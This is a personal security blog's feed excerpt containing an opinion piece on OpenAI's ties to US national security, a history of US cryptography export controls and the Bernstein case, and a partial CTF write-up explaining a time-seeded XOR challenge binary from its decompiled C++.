&lt;p&gt;On June 13th, &lt;a href=&quot;https://openai.com/index/openai-appoints-retired-us-army-general/&quot;&gt;OpenAI appointed&lt;/a&gt; former head of the NSA General &lt;a href=&quot;https://www.defense.gov/About/Biographies/Biography/Article/1531067/general-paul-m-nakasone/&quot;&gt;Paul M. Nakasone&lt;/a&gt; to its board of directors. General Nakasone led the world’s most advanced and well-funded intelligence agency from 2018 until his retirement from uniform on February 2nd, 2024. This resume means he is just about the best person to choose to effectively represent Uncle Sam’s national security interests in this revolutionary technology. General Nakasone has been busy; on July 8th, &lt;a href=&quot;https://www.theguardian.com/world/article/2024/jul/09/chinese-developers-openai-blocks-access-in-china-artificial-intelligence&quot;&gt;OpenAI announced&lt;/a&gt; they would block Chinese IPs from accessing their APIs, effectively closing off the country to their product. We’ll briefly revisit the implications of that in a second. On August 29th, NIST’s Artificial Intelligence Safety Institute &lt;a href=&quot;https://www.nist.gov/news-events/news/2024/08/us-ai-safety-institute-signs-agreements-regarding-ai-safety-research&quot;&gt;announced&lt;/a&gt; that the Institute would “receive access to major new models from [Anthropic and OpenAI] prior to and following their public release.” This means that the US Government has free-reign over OpenAI’s unreleased models like &lt;a href=&quot;https://openai.com/index/sora/&quot;&gt;Sora&lt;/a&gt;, as well as anything else OpenAI has cooking up. OpenAI has attracted the best AI engineers in the Valley and has proven to be more innovative than legacy big tech, so inserting it into the Pentagon’s expansive list of private collaborators alongside Microsoft and Amazon is a no-brainer. In the last few months, OpenAI has seemingly turned into a modern-day Skunkworks for AI, and rumors permeate San Francisco that many of the engineers at OpenAI have had to obtain clearance.&lt;/p&gt;

&lt;p&gt;Blocking IPs from China likely will only prevent some malicious use of Generative AI from the nation. Every person I know from China grew up using one of a number of specialized apps to dodge the country’s censorship system to access the open net and would easily be able to dodge this form of blocking by using any reputable VPN. &lt;a href=&quot;https://open.substack.com/pub/jakemullins/p/the-great-firewall-of-china-part?r=2qhmwk&amp;amp;utm_campaign=post&amp;amp;utm_medium=web&quot;&gt;Restraining access to free information&lt;/a&gt; because of location goes against the gut impulses of many Americans, even if their homeland is an adversary to the US. &lt;del&gt;ClosedAI’s&lt;/del&gt; OpenAI’s deep connection to Microsoft and recent cozying to the US Government obviously informed this decision, and those shareholders do not share the same reluctance to exclude nearly a billion and a half people from this technology.&lt;/p&gt;

&lt;p&gt;While the United States inches toward chip independence and continues the long American tradition of throwing billions of dollars at Silicon Valley in exchange for exclusive access to world-shaking technology, perhaps we should consider whether future steps must be taken to ensure that the best AI stays in the hands of the world’s democracies and whether the current steps are a bridge too far, excluding the Chinese people from the cutting-edge.&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="cryptography" /><category term="censorship" /><category term="america" /><category term="usa" /><category term="government" /><category term="china" /><category term="chips" /><category term="nsa" /><summary type="html">This piece is part two of a three-part series on American industrial policy at the cutting edge of technology. This week, we’ll examine the latest moves the US has made to retain its dominance over China in the AI space, particularly in the realm of chips.</summary></entry><entry><title type="html">Week 14 - Dual Use Technologies - Cryptography</title><link href="http://localhost:4000/year-of-hacking-0xe" rel="alternate" type="text/html" title="Week 14 - Dual Use Technologies - Cryptography" /><published>2024-08-13T00:00:00-06:00</published><updated>2024-08-13T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xe</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xe">&lt;p&gt;I’ve planned a three-part series on how American industrial policy has affected technology development by highlighting the history of a few dual-use technologies. Today, we’ll look at past attempts by the American Government to govern the flow of cryptography research. In the next installment, I’ll look at the government’s involvement in AI Research and chip fabrication.&lt;/p&gt;

&lt;h1 id=&quot;cryptography&quot;&gt;Cryptography&lt;/h1&gt;
&lt;p&gt;For younger hackers, it’s surprising to learn that cryptography was once a heavily regulated field. We’re used to running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip install pycryptodome&lt;/code&gt; and having free reign of state-of-the-art open-source cryptography tools. The open-source nature of this software provides a net benefit from the security that encryption provides to our increasingly networked world.&lt;/p&gt;

&lt;p&gt;However, portions of the US Government have held differing viewpoints over the years. Cryptography was once solely the responsibility of military signals intelligence personnel until about the middle of the Cold War. Think &lt;a href=&quot;https://en.wikipedia.org/wiki/Alastair_Denniston&quot;&gt;Commander Deniston&lt;/a&gt; (Charles Dance’s character) in The Imitation Game. As such, cryptography was defined as a military asset by the Department of State’s International Traffic in Arms Regulation (ITAR). This is the same regulation set that governs the export of military assets like ammunition, firearms, spacecraft, and nuclear weapons research. The fear of the era was that sharing cryptographic techniques would jeopardize national security by exposing Signals Intelligence (SIGINT) sources to adversaries.&lt;/p&gt;

&lt;p&gt;SIGINT is one of the five main intelligence sources and deals with electronic communications. Intercepting these signals and turning them into actionable intelligence has been the National Security Agency’s primary responsibility since its foundation in 1951. In those days, the NSA busied themselves with intercepting analog phone calls and radio communications. As analog gave way to digital, the NSA has worked hard to keep ahead of the curve. In the modern era, they conduct honest-to-god cyberwarfare, with the most famous publicly known operation being &lt;a href=&quot;https://en.wikipedia.org/wiki/Stuxnet&quot;&gt;Stuxnet&lt;/a&gt;, a malware operation discovered in 2010 that crippled Iranian Uranium enrichment efforts for at least half a decade. For the unquestioningly loyal the NSA represents American-bred high technology forwarding democracy abroad and &lt;a href=&quot;https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/3136987/how-nsa-us-cyber-command-are-defending-midterm-elections-one-team-one-fight/&quot;&gt;protecting&lt;/a&gt; &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3608324/us-and-international-partners-issue-recommendations-to-secure-software-products/&quot;&gt;our&lt;/a&gt; &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3849499/nsa-joins-fbi-and-others-to-warn-of-north-korea-cyber-espionage-campaign/&quot;&gt;digital&lt;/a&gt; &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3833594/nsas-final-zero-trust-pillar-report-outlines-how-to-achieve-faster-threat-respo/&quot;&gt;assets&lt;/a&gt; at &lt;a href=&quot;https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3735130/nsa-issues-guidance-for-maturing-data-security/&quot;&gt;home&lt;/a&gt;. For the private, disillusioned, paranoid, or outspoken, the NSA is the most &lt;a href=&quot;https://www.eff.org/nsa-spying&quot;&gt;advanced&lt;/a&gt; &lt;a href=&quot;https://www.eff.org/press/releases/diverse-groups-fly-airship-over-nsas-utah-data-center-protest-illegal-internet-spying&quot;&gt;surveillance&lt;/a&gt; &lt;a href=&quot;https://www.aclu.org/news/national-security/nsa-continues-violate-americans-internet-privacy&quot;&gt;network&lt;/a&gt; in the world that has easily &lt;a href=&quot;https://en.wikipedia.org/wiki/Edward_Snowden&quot;&gt;turned on Americans&lt;/a&gt; labelled &lt;a href=&quot;https://commons.lib.jmu.edu/cgi/viewcontent.cgi?article=1280&amp;amp;context=mhr&quot;&gt;troublemakers&lt;/a&gt; by the Government.&lt;/p&gt;

&lt;h2 id=&quot;but-what-is-cryptography&quot;&gt;But what is cryptography?&lt;/h2&gt;
&lt;p&gt;Cryptography is the mathematical science of transmitting data between two trusted points over an untrusted medium in a way that the data cannot be deciphered if intercepted. You may remember the push to visit websites that only start with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://&lt;/code&gt; and steer clear from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://&lt;/code&gt; sites that began in the early 2000s. This is because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://&lt;/code&gt; means the connection is encrypted, preventing a “man-in-the-middle” attack from altering or intercepting sensitive data.&lt;/p&gt;

&lt;p&gt;In a typical symmetric cryptosystem, you have five pieces of information you care about:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;em&gt;Plaintext&lt;/em&gt;: The information you want to hide.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Key&lt;/em&gt;: The piece of information used to both encrypt and decrypt the plaintext.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Ciphertext&lt;/em&gt;: Encrypted information that should be unintelligible to an outside observer.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Encryption function&lt;/em&gt;: Mathematical process that takes the &lt;em&gt;plaintext&lt;/em&gt; and the &lt;em&gt;key&lt;/em&gt; to produce the &lt;em&gt;ciphertext&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Decryption function&lt;/em&gt;: Mathematical process that takes the &lt;em&gt;ciphertext&lt;/em&gt; and the &lt;em&gt;key&lt;/em&gt; to produce the &lt;em&gt;plaintext&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Notice that you use the same key to both encrypt and decrypt the data, hence the adjective “symmetric” in symmetric cryptography. The key is shared over a secure channel between the two hosts. This ensures the confidentiality of the encrypted data. Some of the modern algorithms in this group are AES, DES, and Blowfish. This scheme commonly used when you want to encrypt data while it remains in a file or a database when it’s not being actively used.
&lt;img src=&quot;https://miro.medium.com/v2/resize:fit:952/0*lKHBVWTrLKGv169g.png&quot; alt=&quot;Symmetric Encryption&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A different paradigm exists called asymmetric cryptography, which uses a combination of public and private keys to both ensure confidentiality and non-repudiation, a fancy word for provable authorship of data. This is useful when validating the source of data or software. If a piece of data can be decrypted with a public key, then we know that it was encrypted with the private key.
&lt;img src=&quot;https://www.ssl2buy.com/wp-content/uploads/2015/12/Asymmetric-Encryption.png&quot; alt=&quot;Asymmetric Encryption&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This architecture is more complicated to set up, but the benefits of non-repudiation often outweigh the upfront costs. This include the EC25519 and RSA algorithms.&lt;/p&gt;

&lt;h2 id=&quot;cryptography-and-the-us-governments-failings&quot;&gt;Cryptography and the US Government’s Failings&lt;/h2&gt;
&lt;p&gt;The national security implications of implementing cryptography become apparent if the medium that the data is being transmitted over, be it a fiber-optic hard line, DSL link, or electromagnetic waves through the open air, is compromised or intercepted. In the days of ARPANET, when four universities exchanged research data over phone lines, the stakes of the data being intercepted and tampered with were low. In the seventies, however, digital networked systems increased in complexity and capability and became a cornerstone in the banking and defense sectors of the American economy. These two sectors require security as a cornerstone of their operations. In the modern landscape, those two sectors are the biggest employers of top-notch cybersecurity talent. This required the introduction of encryption into civilian digital infrastructure to protect financial assets and classified information. In 1977, NIST ratified the Data Encryption Standard (DES) algorithm developed by IBM as a requirement of the Federal Information Processing Standards (FIPS). This required any contractors handling sensitive government data must encrypt it using the DES algorithm. DES is a symmetric encryption method that can take 64-bit message blocks and encrypt them with a 56-bit key. In 1976, before the ratification, Researcher Paul Baran theorized that DES would take about &lt;a href=&quot;http://www.toad.com/des-stanford-meeting.html&quot;&gt;20 million dollars&lt;/a&gt; to break with the hardware of the time. There are only $2^{56}$ or 72 quadrillion possible keys due to the key length being 56 bits. That sounds like a lot unless you work in tech, then you can likely intuit that this is a painfully small amount of possible keys to decrypt data that could have serious national security implications. In 1998, the Electronic Frontier Foundation would demonstrate that it was &lt;a href=&quot;https://w2.eff.org/Privacy/Crypto/Crypto_misc/DESCracker/&quot;&gt;possible&lt;/a&gt; to break the encryption for about 250,000 dollars with mostly off-the-shelf parts in about 3 days. Projecting that rate of improvement to today, it would now take something like a grand of hardware to execute the same attack. Well within the cost of a mid-range laptop.
&lt;img src=&quot;https://w2.eff.org/Privacy/Crypto/Crypto_misc/DESCracker/imgz/board300.jpg&quot; alt=&quot;Deep Crack&quot; /&gt;
&lt;em&gt;Deep Crack, the custom-built machine to crack DES by the EFF in 1998&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Before cryptography had fully embedded itself into the public sector, the Department of Defense had to sign off on any export of cryptography. This means that any research papers, source code, and compiled code would require approval by the Department of Defense before publication. The American Government legally censored cryptographic research, stifling the development of secure methods of communication for Americans and the rest of the world. That previous sentence likely made you question the competence of the American policymaker. You may feel this way because you understand Kerckhoff’s principle, even if you’re not a trained cryptographer.&lt;/p&gt;

&lt;p&gt;Kerckhoff’s principle is a core design philosophy of modern cryptographic systems. The principle states that a cryptosystem should be perfectly secure even if everything except the secret key is known to an attacker. This means that an attacker cannot decrypt a message even if they know the version of the specific cryptographic implementation, destination, source, message length, or any other characteristic of the message. In the modern internet environment, including the connection you are reading this article on, sometimes more than a dozen separate legitimate organizations intercept the data that makes up this website. No one, not even an attacker with full access to one of the routers handling this connection, will be able to read the plaintext contents of the encrypted data without possessing the secret if an encryption scheme was implemented correctly.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;There are some &lt;a href=&quot;https://crypto.stanford.edu/~dabo/cryptobook/BonehShoup_0_6.pdf#page=28&quot;&gt;caveats&lt;/a&gt; with the phrase “perfectly secure” that will make mathematicians who attended week 2 of a graduate-level cryptography class bristle at my cavalier usage of it. To a layman, however, the point gets across.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Kerckhoff’s principle is a vocab word that every Mathematics, Information Technology, and Cybersecurity student has had to memorize for a multiple-choice question on a midterm (or in my case, a crossword answer). The principle is intuitive. In a scenario where you are transmitting sensitive information over a medium that can be intercepted, it is only a matter of time before an attacker reverse-engineers the encryption scheme. A cryptosystem that is designed to be secure by having many complicated steps in the encryption and decryption processes that are unknown to an attacker is objectively worse than a cryptosystem that relies on public and peer-reviewed algorithms and implementations. This makes sense for the same reason that open source is so powerful. Anyone with the proper training can discover vulnerabilities and make them public. Good-faith researchers can point out flaws in an implementation, preventing them from being used by cybercriminals and nation-states alike. Improving the security of an algorithm and thus the entire internet ecosystem.&lt;/p&gt;

&lt;p&gt;With this understanding, it is no surprise that the Government has not sought to restrict the export of cryptography to the international community in nearly three decades. If the Government could only utilize research from American cryptographers who can obtain clearance, want to live in Washington DC, and are willing to be underpaid for their skills instead of raking it in as a high-frequency trader on Wall Street, the American Military would fall behind the rest of the world, a state of affairs that is entirely anathema to what it means to be an American. The last time the US Government tried to exercise these export controls on academic cryptography research resulted in Bernstein v. Department of Justice, 1998. This landmark case set the precedent that source code is protected as freedom of speech under the First Amendment.&lt;/p&gt;

&lt;h3 id=&quot;bernstein-v-united-states-and-code-as-speech&quot;&gt;Bernstein v. United States and Code as Speech&lt;/h3&gt;
&lt;p&gt;In 1990, Daniel J. Bernstein, an American Berkeley student, developed an experimental algorithm called Snuffle. He attempted to comply with export controls to distribute his work to Sci.crypt, a cryptography-centric forum. He was denied an export license despite his insistence that there was no military utility to the work. Bernstein appealed his initial request but was &lt;a href=&quot;https://groups.csail.mit.edu/mac/classes/6.805/student-papers/fall95-papers/kokoski-crypto.html&quot;&gt;ignored for fifteen months&lt;/a&gt; despite regulations requiring a government response to such requests within thirty days. In 1995, Bernstein and the Electronic Frontier Foundation filed a lawsuit in the North District of California against the US Government, alleging export controls on source code and research were unconstitutional.&lt;/p&gt;

&lt;p&gt;Source code can be viewed as a different from of a plain English representation of an algorithm. Using a program called a compiler to turn source code into executable code, source code can be subjected to the same academic rigor that a typical mathematical proof is through automated testing. An excerpt from the &lt;a href=&quot;https://archive.epic.org/crypto/export_controls/bernstein_decision_9_cir.html&quot;&gt;argument presented by Bernstein’s lawyers&lt;/a&gt; highlights how keeping in line with the First Amendment requires treating source code with the same freedom of speech protections as a plain-English algorithm:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;As noted earlier, the chief task for cryptographers is the development of secure methods of encryption. While the articulation of such a system in layman’s English or in general mathematical terms may be useful, the devil is, at least for cryptographers, often in the algorithmic details. By utilizing source code, a cryptographer can express algorithmic ideas with precision and methodological rigor that is otherwise difficult to achieve. This has the added benefit of facilitating peer review – by compiling the source code, a cryptographer can create a working model subject to rigorous security tests. The need for precisely articulated hypotheses and formal empirical testing, of course, is not unique to the science of cryptography; it appears, however, that in this field, source code is the preferred means to these ends.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Footnote 14 of that document points out that the subject of this article, Bernstein’s Snuffle algorithm, isn’t even a complete cryptographic product. It’s just an educational proof of concept. The plaintiffs argue that the Government mistakenly separates source code as unable to constitute a meaningful expression, as opposed to something like a blueprint or a manual, because of the presence of “direct functionality.” They argue that if Adam Smith wrote the Wealth of Nations with equations or graphs, it would potentially be subject to prepublication review to show the absurdity of regulating academic discourse based on the possibility for the findings to be applicable in the real world. The National Security Agency has shown a disregard for considering cryptographic source code as expression, stripping it of First Amendment protections. The article cites a statement made by the NSA:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Whatever ideas may be reflected in the software, or the intent of the exporter to convey ideas, the NSA recommends that encryption software be controlled for export solely on the basis of what it does.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There have been instances where First-Amendment protections can be legally trampled in the face of a plausible and immediate national security threat. The argument cites the famous United States v. Progressive Inc. where the Department of Energy sought an injunction against &lt;em&gt;The Progressive&lt;/em&gt;, an American magazine, for attempting to publish an article on the technical details of the then-classified Hydrogen Bomb. According to the &lt;a href=&quot;https://firstamendment.mtsu.edu/article/united-states-v-progressive-inc-w-d-wis/&quot;&gt;Free Speech Center&lt;/a&gt;, the injunction was ultimately unsuccessful in its goal as at least seven publications released similar articles. Skimming through the article today, it’s interesting how the information that drew the American Government’s ire 50 years ago is now common knowledge for anyone with a cursory interest in nuclear energy, or enjoy videos on &lt;a href=&quot;https://www.youtube.com/watch?v=v9srYCefm18&quot;&gt;Kerbal Space Program&lt;/a&gt;. Despite this failure to contain delicate information, the case is cited today when the American Government seeks to preserve national security at the expense of free journalism. If Bernstein was a cleared ex-NSA cryptographer known to be sympathetic to the Soviet Union publishing classified algorithms to a European journal, a credible national security threat is present, and an export license could easily be denied to prevent the dissemination of state secrets. However, Bernstein was a researcher at a top-of-the-line public research university developing his own encryption algorithm. His work presented no credible and immediate national security threat, and thus restriction of his work under ITAR was deemed unconstitutional by Judge Patel.&lt;/p&gt;

&lt;h2 id=&quot;cryptography-and-the-us-governments-successes&quot;&gt;Cryptography and the US Government’s Successes&lt;/h2&gt;
&lt;p&gt;Bernstein v. United States was decided in 1996 with attempts made to reverse the decision going all the way to 2003. In the intervening 28 years, there have been no public attempts by the US government to regulate academic research into cryptography and the development of new algorithms and attacks. In fact, the CHIPS and Science act provides funding for public research into future-proofing our communications systems with quantum cryptography. This shift has shown that the American policymaker is actually capable of making a forward-thinking decision, much to many Americans’ surprise. When/if/when we can get quantum computers working, these expensive gizmos have the capability of revolutionizing the world of cryptography, making computationally impossible attacks with classical computers not only feasible, but trivial. If you’re a remarkably short-sighted national security professional, this investment into public research into quantum cryptography could strip the ability of the American intelligence community to create actionable intelligence in the future. However, any intelligence analyst will tell you that our adversaries are capable of developing quantum hardware and are not likely to share the advancements with the rest of the world. The difference between the United States and our four major adversaries in China, Russia, Iran, and North Korea is that we choose to govern as a liberal democracy. Our policymakers are incentivized to recognize when the short-term gains of increased visibility into the world’s communications at the expense of long-term security for both our people and our nation is a tradeoff that should not be made. It seems we have exported this habit to other nations. Today, the cryptography community is full of hackers, academics, government researchers, and hobbyists from every corner of the globe, with American universities training the top minds in the field.&lt;/p&gt;

&lt;h2 id=&quot;resources&quot;&gt;Resources&lt;/h2&gt;
&lt;p&gt;Here’s a list of my favorite resources that provide a good introduction to Cryptography without a formal mathematics background.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;cryptohack.com&quot;&gt;Cryptohack&lt;/a&gt;: A website that teaches advanced cryptography from first principles. Go from XORing messages to implementing elliptical curve cryptography and beyond by hand.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://discord.gg/h9E7cna5pV&quot;&gt;Cryptohack Discord&lt;/a&gt;: The discord community for the Cryptohack website. Join hobbyists, hackers, and researchers alike unified in their love for breaking into things.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cryptopals.com/&quot;&gt;cryptopals&lt;/a&gt;: Another website providing CTF-like challenges for cryptography.&lt;/li&gt;
  &lt;li&gt;Math 290 textbook: Helps with writing proofs&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://crypto.stanford.edu/~dabo/cryptobook/BonehShoup_0_6.pdf&quot;&gt;A Graduate Course in Applied Cryptography&lt;/a&gt;: Free textbook from Stanford&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nessie.ilab.sztaki.hu/~kornai/2021/MatematikaAlapjai/ChartrandPolimeniZhang.pdf&quot;&gt;Mathematical Proofs: A Transition to Advanced Mathematics&lt;/a&gt;: Introduction to thinking and writing proofs.
If you are already have a formal mathematical background, I asked my friend &lt;a href=&quot;https://www.linkedin.com/in/macen-bird/&quot;&gt;Macen Bird&lt;/a&gt; to collate some of advanced resources in the space:&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jmilne.org/math/CourseNotes/FT.pdf&quot;&gt;Fields and Galois Theory&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.jmilne.org/math/CourseNotes/ANT.pdf&quot;&gt;Algebraic Number Theory&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ur4ndom.dev/posts/2024-02-26-lattice-training/&quot;&gt;Practical lattice reductions for CTF challenges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.davidwong.fr/blockbreakers/aes.html&quot;&gt;AES Cryptanalysis for beginners&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://hal.science/hal-03045663/document&quot;&gt;Cryptographic key recovery paper&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rareskills.io/post/elliptic-curves-finite-fields&quot;&gt;Elliptic Curves over Finite Field - Used in any elliptic curve algorithm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/josephsurin/lattice-based-cryptanalysis/blob/main/tutorial.pdf&quot;&gt;A Gentle Tutorial for Lattice-Based Cryptanalysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/isislovecruft/library--/blob/master/cryptography%20%26%20mathematics/An%20Introduction%20to%20Mathematical%20Cryptography%20(2014)%20-%20Hoffstein%2C%20Pipher%2C%20Silverman.pdf&quot;&gt;An Introduction to Mathematical Cryptography&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.archive.org/web/20220508113525/https://www.cryptool.org/download/ctb/CTB-Chapter_Lattice-Introduction_en.pdf&quot;&gt;Lightweight Introduction to Lattices&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;music-from-this-week&quot;&gt;Music from this week&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/2Dl6xEOmTWxi633TuZITw5?si=bb8e9dbbaf6048da&quot;&gt;Akhasmak Ah&lt;/a&gt; - Nancy Ajram&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/3qQbCzHBycnDpGskqOWY0E?si=5e81043b38114719&quot;&gt;Ella Baila Sola&lt;/a&gt; - Estaban Armado&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/3YyTyWfSwAhesGCKpnuRKl?si=1dd569003a664c1e&quot;&gt;LA PEOPLE II&lt;/a&gt; - Peso Pluma, Tito Double P, Joel De La P&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="cryptography" /><category term="censorship" /><category term="government" /><category term="nsa" /><summary type="html">I’ve planned a three-part series on how American industrial policy has affected technology development by highlighting the history of a few dual-use technologies. Today, we’ll look at past attempts by the American Government to govern the flow of cryptography research. In the next installment, I’ll look at the government’s involvement in AI Research and chip fabrication.</summary></entry><entry><title type="html">Week 13 - Time - BYUCTF 2024 C++ Reverse Engineering</title><link href="http://localhost:4000/year-of-hacking-0xd" rel="alternate" type="text/html" title="Week 13 - Time - BYUCTF 2024 C++ Reverse Engineering" /><published>2024-07-29T00:00:00-06:00</published><updated>2024-07-29T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0xd</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0xd">&lt;p&gt;This winter, I’ll be taking &lt;a href=&quot;https://x.com/legoclones&quot;&gt;@legoclones&lt;/a&gt;/&lt;a href=&quot;https://www.linkedin.com/in/justin-applegate-b23676139/&quot;&gt;Justin Applegate&lt;/a&gt;’s Vulnerability Research and Reverse Engineering class for credit, and he gave me some challenges from BYUCTF 2024 to work through to keep my technical skills up to snuff. I breezed through this one, so the post is short this week. I’m getting into the habit of writing 500 words a day on different projects, so bigger and more impressive things are coming.&lt;/p&gt;

&lt;p&gt;Thanks to Justin for helping me out, you are wicked smart and stunningly beautiful (please give me an A). Watch out for his DEFCON talk this August.&lt;/p&gt;

&lt;h1 id=&quot;time&quot;&gt;Time&lt;/h1&gt;
&lt;p&gt;We get a simple 64-bit ELF binary that requires the existence of a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;. After creating the file, it spits out this:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XOR Result:     205 155 252 133 189 74 225 200 162 239 73 188 62 238 128 224 100 170 226 91 241 175 32 164
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, trying it a few seconds later, it spits out a completely different answer.&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;XOR Result:     57 55 107 17 42 102 143 180 70 83 165 10 33 41 64 221 236 147 229 226 120 231 99 121
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can assume that this is some kind of representation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; file. Running the binary multiple times in a second results in the same result, but only when within the same second. It looks like the output of the program is dependent on the system ztime.&lt;/p&gt;

&lt;p&gt;Loading it up in Ghidra, we see that it was compiled in C++. I did a little bit of relabeling below.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C++&quot;&gt;undefined8 main(void)

{
  char file_is_open;
  bool is_end;
  int rand_int;
  time_t time;
  basic_ostream *xored_char;
  undefined8 uVar1;
  long in_FS_OFFSET;
  undefined8 begin_str;
  undefined8 end_str;
  basic_string *local_258;
  char *char_byte;
  basic_string file_content [32];
  basic_istream flag_file [520];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  std::basic_ifstream&amp;lt;&amp;gt;::basic_ifstream((char *)flag_file,0x102004);
                    /* try { // try from 001013d0 to 00101406 has its CatchHandler @ 001015b9 */
  file_is_open = std::basic_ifstream&amp;lt;&amp;gt;::is_open();
  if (file_is_open == 1) {
    std::__cxx11::basic_string&amp;lt;&amp;gt;::basic_string();
                    /* try { // try from 00101434 to 0010156a has its CatchHandler @ 001015a1 */
    std::getline&amp;lt;&amp;gt;(flag_file,file_content);
    std::basic_ifstream&amp;lt;&amp;gt;::close();
    time = ::time((time_t *)0x0);
    srand((uint)time);
    std::operator&amp;lt;&amp;lt;((basic_ostream *)std::cout,&quot;XOR Result:     &quot;);
    local_258 = file_content;
    begin_str = std::__cxx11::basic_string&amp;lt;&amp;gt;::begin();
    end_str = std::__cxx11::basic_string&amp;lt;&amp;gt;::end();
    while( true ) {
      is_end = __gnu_cxx::operator!=((__normal_iterator *)&amp;amp;begin_str,(__normal_iterator *)&amp;amp;end_str);
      if (!is_end) break;
      char_byte = (char *)__gnu_cxx::__normal_iterator&amp;lt;&amp;gt;::operator*
                                    ((__normal_iterator&amp;lt;&amp;gt; *)&amp;amp;begin_str);
      rand_int = rand();
      xored_char = (basic_ostream *)
                   std::basic_ostream&amp;lt;&amp;gt;::operator&amp;lt;&amp;lt;
                             ((basic_ostream&amp;lt;&amp;gt; *)std::cout,(int)*char_byte ^ rand_int % 0x100);
      std::operator&amp;lt;&amp;lt;(xored_char,&quot; &quot;);
      __gnu_cxx::__normal_iterator&amp;lt;&amp;gt;::operator++((__normal_iterator&amp;lt;&amp;gt; *)&amp;amp;begin_str);
    }
    std::basic_ostream&amp;lt;&amp;gt;::operator&amp;lt;&amp;lt;((basic_ostream&amp;lt;&amp;gt; *)std::cout,std::endl&amp;lt;&amp;gt;);
    uVar1 = 0;
    std::__cxx11::basic_string&amp;lt;&amp;gt;::~basic_string((basic_string&amp;lt;&amp;gt; *)file_content);
  }
  else {
    xored_char = std::operator&amp;lt;&amp;lt;((basic_ostream *)std::cerr,&quot;Error opening file \&apos;flag.txt\&apos;&quot;);
    std::basic_ostream&amp;lt;&amp;gt;::operator&amp;lt;&amp;lt;((basic_ostream&amp;lt;&amp;gt; *)xored_char,std::endl&amp;lt;&amp;gt;);
    uVar1 = 1;
  }
  std::basic_ifstream&amp;lt;&amp;gt;::~basic_ifstream((basic_ifstream&amp;lt;&amp;gt; *)flag_file);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar1;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one is pretty straightforward. It takes the system time, which is represented as the number of seconds since January 1st, 1970. It then uses that as the seed for a random number generator. For every char, it uses this seeded random number generator to generate a new integer, take the least significant byte of that new integer, and XOR it with the char. It will then print it out as an unsigned integer.&lt;/p&gt;

